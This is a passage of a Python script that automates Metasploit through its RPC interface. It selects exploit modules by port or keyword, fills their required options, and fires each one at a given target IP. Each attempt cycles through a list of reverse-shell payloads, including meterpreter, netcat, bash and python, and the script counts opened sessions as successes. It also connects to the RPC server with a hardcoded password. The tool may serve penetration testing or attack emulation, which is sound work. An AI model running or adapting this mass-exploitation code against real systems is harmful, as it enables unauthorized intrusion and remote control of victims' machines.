    "CheckScanner": "auxiliary/scanner/smb/smb_ms17_010",
    "CMD": 'pwd',

    # options that need to be filled in later
    "LHOST": '',
    "RHOST": '',
    "RHOSTS": '',
    "RSRVHOST": '',
    "SRVHOST": '',

    # default payload
    "PAYLOADS": ['cmd/unix/interact', 'cmd/unix/reverse_netcat', 'windows/meterpreter/reverse_tcp', 'windows/x64/meterpreter/reverse_tcp', 'generic/shell_reverse_tcp', 'cmd/unix/reverse_openssl', 'cmd/unix/reverse_python',  'cmd/unix/reverse_perl', 'cmd/unix/reverse_stub', 'cmd/unix/reverse', 'cmd/unix/reverse_bash', 'windows/shell/reverse_ord_tcp', 'cmd/unix/generic']
}


def filter_port(client, port):
    """
    Filter all modules by default port
    :param client: MSFRpc client
    :param port: port to filter by
    :return:
    """
    exploits = []
    for e in client.modules.exploits:
        ex = client.modules.use('exploit', e)
        try:
            if str(ex['RPORT']) == str(port):
                exploits.append(e)
        except KeyError as e:
            if verbose:
                print(f"{e} in filter port. RPORT is invalid")
            continue

    return exploits


def filter_keywords(client, keywords, exploits=None):
    """
    Filter a list of exploits or all exploits by a list of keywords
    :param client: msfrpc client
    :param keywords: list of keywords
    :param exploits: list of exploits. default is none so will quer msfrpc
    :return: filtered list of exploits to try
    """
    filtered = []
    if exploits is None:
        exploits = client.modules.exploits

    # filter exploits (name and description) for keywords
    for e in exploits:
        for k in keywords:
            # if keyword in name, add to list
            if k.lower() in e.lower():
                filtered.append(e)
            # if keyword in description, add to list
            else:
                ex = client.modules.use('exploit', e)
                try:
                    if k.lower() in ex.__dict__['description'].lower():
                        filtered.append(e)
                except KeyError as e:
                    print(f"{e} in filter keyword. {k} is invalid")

    return filtered


def find_options(client, exploits):
    """
    uses msfrpc client to find exploit required options
    :param client: msfrpc client
    :param exploits: list of exploits to find options for
    :return:
    """
    options = []
    for e in exploits:
        ex = client.modules.use('exploit', e)
        opts = ex.missing_required

        for o in opts:
            if o not in options:
                options.append(o)

    print(options)


def find_payloads(client, exploits):
    """
    use msfrpc client to find payloads that work with a list of exploits
    :param client: msfrpc client
    :param exploits: exploits to search through
    :return:
    """
    payloads = []
    for e in exploits:
        ex = client.modules.use('exploit', e)
        opts = ex.targetpayloads()
        for o in opts:
            if o not in payloads:
                payloads.append(o)

    print(payloads)


def get_lhost():
    """
    :return: this hosts's IP address
    """
    global defaults
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        try:
            s.connect_ex(('10.255.255.255', 1))
            defaults['LHOST'] = s.getsockname()[0]
        except:
            defaults['LHOST'] = '0.0.0.0'
    if verbose:
        print(f"LHOST: {defaults['LHOST']}")


def exploit_all(client, exploits, target_ip):
    """
    run a list of exploits against a target using the msfrpc
    :param client: msfrpc client
    :param exploits: list of exploits to run
    :param target_ip: target you wish to exploit
    :return:
    """

    # set remote host variables
    defaults['RHOSTS'] = target_ip
    defaults['RHOST'] = target_ip
    defaults['RSRVHOST'] = target_ip
    defaults['SRVHOST'] = target_ip

    sessions = len(client.sessions.list)
    lport = 30000

    if verbose:
        print(f"Launching {len(exploits)} at {target_ip}")

    for e in exploits:
        try:
            ex = client.modules.use('exploit', e)
            if verbose:
                print(ex.modulename)
            for o in ex.missing_required:
                with open('/tmp/missing_required', 'a') as f:
                    f.write(f"{e}\n")

                try:
                    ex[o] = defaults[o]
                except KeyError as e:
                    if verbose:
                        print(f"{e} during exploit all. {o} is invalid for defaults or {ex.modulename}")

            tries = 1
            for p in defaults['PAYLOADS']:
                try:
                    payload = client.modules.use('payload', p)
                    for o in payload.missing_required:
                        payload[o] = defaults[o]

                    if 'LPORT' in payload.required:
                        try:
                            payload['LPORT'] = str(lport)
                            if verbose:
                                print(f"Try {tries} with port {lport}")
                            lport += 1
                        except KeyError as e:
                            if verbose:
                                print(f"{e} during exploit all. LPORT is invalid")

                    if verbose:
                        ex.execute(payload=payload)
                    else:
                        ex.execute(payload=payload)
                    tries += 1
                    break

                # payload doesn't work with this exploit, try another
                except ValueError:
                    if tries < len(defaults['PAYLOADS']):
                        tries += 1
                        continue
                    else:
                        if verbose:
                            print(ex.targetpayloads())

                # something weird happened. Wait and try again
                except ConnectionError:
                    sleep(1)
                    try:
                        if verbose:
                            print(ex.execute(payload=payload))
                        else:
                            ex.execute(payload=payload)
                    except:
                        continue
        except Exception:
                if verbose:
                    print("Some other exception happened")
                continue

        if len(client.sessions.list) > sessions:
            if verbose:
                print(f"SUCCESS of {ex.modulename}. Sessions is now length {len(client.sessions.list)}")
            sessions = len(client.sessions.list)

    t = 0
    while len(client.jobs.list) > 0 and t < 30:
        if verbose:
            print(f"Waiting for job(s) {client.jobs.list}")
        sleep(1)
        t += 1

    # a list of successful exploits will be printed to be parsed as facts
    # only add the exploit is there is a valid session that matches the target and an attempted exploit

    # successes = []
    # for ses in client.sessions.list:
    #     try:
    #         s = [i for i in exploits if i in client.sessions.list[ses]['via_exploit']
    #              and client.sessions.list[ses]['target_host'] in target_ip]
    #         for i in s:
    #             if i not in successes:
    #                 successes.append(i)
    #     except KeyError:
    #         continue
    # for s in successes:
    #     print(f"{target_ip}:{s}")


def main():
    # cmdline args
    parser = argparse.ArgumentParser()
    parser.add_argument('--target', required=True)
    parser.add_argument('--query', action='store_true', default=False,
                        help='If set, this will query the msfrpc server for exploits. '
                             'Otherwise, it will use defaults')
    parser.add_argument('--all', action='store_true', default=False)
    parser.add_argument('--keywords', required=False)
    parser.add_argument('--server', required=True)
    parser.add_argument('--print', action='store_true', default=False)
    parser.add_argument('--verbose', action='store_true', default=False)
    args = parser.parse_args()

    global verbose
    if args.verbose:
        verbose = True

    # server is provided -- Connect to it
    ip = args.server[7:-5]  # strip off http:// from beginning & :8888 at the end
    client = MsfRpcClient(server=ip, password='password')
    defaults['LHOST'] = ip

    # # stop remaining jobs
    # if len(client.jobs.list) > 0:
    #     for j in client.jobs.list:
    #         client.jobs.stop(j)


    # transform keywords to list or None
    keywords = args.keywords.split(',') if args.keywords else None

    if args.all:
        if ':' in args.target:
            split = args.target.split(':')
            target_ip = split[0]
            port = split[1]
        else:
            target_ip = args.target
        exploits = client.modules.exploits
        if args.print:
            print(exploits)
            print(len(exploits))
            print("Required variables:")
            for e in exploits:
                print(client.modules.use('exploit', e).missing_required)
            exit(0)
        exploit_all(client, exploits, target_ip)
    else:
        port = '80' # default port is 80, or get the port from the target arg
        if ':' in args.target:
            split = args.target.split(':')
            target_ip = split[0]
            port = split[1]
        else:
            target_ip = args.target

        # query msfrpc server for exploits and filter down to a port
        if args.query:
            exploits = filter_port(client, port)

        # just use the default exploits for the port
        else:
            try:
                exploits = exploit_dict[port]
            except KeyError:
                print("Unknown port. Exiting")
                exit(1)

        # filter exploits by keywords
        if keywords is not None:
            exploits = filter_keywords(client, keywords, exploits)

        # just print the exploits that you could use
        if args.print:
            print(exploits)
            print(len(exploits))

        else:
            try:
                exploit_all(client, exploits, target_ip)
            # If there is some kind of exception, just try again. Hopefully it works...
            except Exception:
                exploit_all(client, exploits, target_ip)


if __name__ == "__main__":
    main()
